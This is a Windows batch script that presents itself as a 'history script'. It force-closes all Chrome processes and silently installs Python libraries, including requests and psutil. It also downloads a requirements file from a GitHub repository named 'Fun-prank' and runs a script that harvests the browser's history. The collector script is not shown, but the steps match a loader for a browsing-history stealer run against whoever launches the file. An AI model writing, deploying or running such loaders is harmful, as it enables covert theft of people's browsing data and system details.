@echo off
title Installing and Running History Script...

:: Close all Chrome processes (including background processes)
echo Closing all Google Chrome processes...
taskkill /F /IM chrome.exe >nul 2>nul
taskkill /F /IM chrome_driver.exe >nul 2>nul
taskkill /F /IM chrome_renderer.exe >nul 2>nul
taskkill /F /IM chrome_child.exe >nul 2>nul

:: Wait for Chrome to fully close (increase the wait time if needed)
timeout /t 10 /nobreak >nul

:: Create the history directory if it doesn't exist
echo Creating history directory...
mkdir "%APPDATA%\history" >nul 2>nul

:: Install required libraries (requests, psutil, gpuinfo)
echo Installing required libraries...
python -m pip install --upgrade requests psutil gpuinfo >nul 2>nul

:: Download requirements.txt if not already present
echo Downloading requirements.txt...
curl -o "%APPDATA%\history\requirements.txt" https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt >nul 2>nul

:: Install libraries from requirements.txt
echo Installing libraries from requirements.txt...
python -m pip install --upgrade -r "%APPDATA%\history\requirements.txt" >nul 2>nul

:: Run the Python script to gather history
echo Running the Python script...
python "%APPDATA%\history\history_report.py"

:: Reopen Google Chrome
echo Reopening Google Chrome...
start chrome

:: Pause to keep the window open for any output
pause
